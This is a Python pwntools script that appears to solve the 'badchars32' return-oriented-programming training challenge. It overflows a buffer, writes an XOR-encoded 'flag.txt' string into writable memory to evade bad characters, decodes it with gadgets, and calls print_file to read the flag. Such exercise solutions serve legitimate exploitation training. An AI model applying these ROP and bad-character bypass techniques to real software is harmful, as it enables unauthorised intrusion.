from pwn import *


bad_chars = ['x','g','a','.']

# 8 bytes big and writeable, after that comes .bss with null bytes
data_section_adr = 0x0804a018


binary = "./badchars32"

elf = ELF(binary)

print_file_plt = elf.plt["print_file"]
log.info("print_file_plt: " + hex(print_file_plt) + f" {print_file_plt}")


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def adjust_key_to_32_bit(key):
    return pack(key, 8) * 4


def xor_adr(adr, n, key):

    log.info("key: " + hex(key) + f" {key}")

    assert key <= 255
    key = adjust_key_to_32_bit(key)

    log.info(f"key: {key}")

    # GADGETS
    # bl = low 8 bits of ebx
    # 0x080485bb : pop ebp ; ret
    pop_target_adr_gadget = 0x080485bb
    # 0x08048547 : xor byte ptr [ebp], bl ; ret
    xor_one_byte_gadget = 0x08048547
    # 0x0804839d : pop ebx ; ret
    pop_key_gadget = 0x0804839d

    chain = b""
    chain += pack(pop_key_gadget, 32)
    chain += key  # -> ebx/ bl

    for i in range(n):
        chain += pack(pop_target_adr_gadget, 32)
        chain += pack(adr+i, 32)
        chain += pack(xor_one_byte_gadget, 32)
    return chain


# adr is safe
# flag is fucked
# move gadget is safe
# .txt is fucked
def write_8_bytes_to_adr_and_xor(data, adr, key):
    assert len(data) == 8

    log.info(f"data: {data}")
    data = byte_xor(data, adjust_key_to_32_bit(key)*2)
    log.info("bad chars: 0x61 (a), 0x78 (x), 0x2e (.), 0x67 (g)")
    log.info(f"xored data: {data}")

    assert len(data) == 8

    # GADGETS
    # 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
    pop_values_gadget = 0x080485b9
    # 0x0804854f : mov dword ptr [edi], esi ; ret
    move_gadget = 0x0804854f


    # WRITE FIRST HALF OF PAYLOAD INTO ADR
    chain = b""
    chain += pack(pop_values_gadget, 32)
    chain += data[:4]   # -> esi (target value)
    chain += pack(adr, 32)   # -> edi (target adr)
    chain += b"B"*4  # -> ebp (not needed yet)
    chain += pack(move_gadget, 32)


    # WRITE SECOND HALF OF PAYLOAD INTO ADR
    chain += pack(pop_values_gadget, 32)
    chain += data[4:]  # -> esi (target value)
    chain += pack(adr+4, 32)  # -> edi (target adr)
    chain += b"C"*4   # -> ebp (not needed yet)
    chain += pack(move_gadget, 32)

    chain += xor_adr(adr, len(data), key)
    return chain


key = 133

payload = b""
payload += b"A"*(54-8-2)
payload += write_8_bytes_to_adr_and_xor(b"flag.txt", data_section_adr, key)
# call function
payload += pack(print_file_plt, 32)
payload += b"B"*4   # ret
payload += pack(data_section_adr, 32)


write("/tmp/docgil", payload)

p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")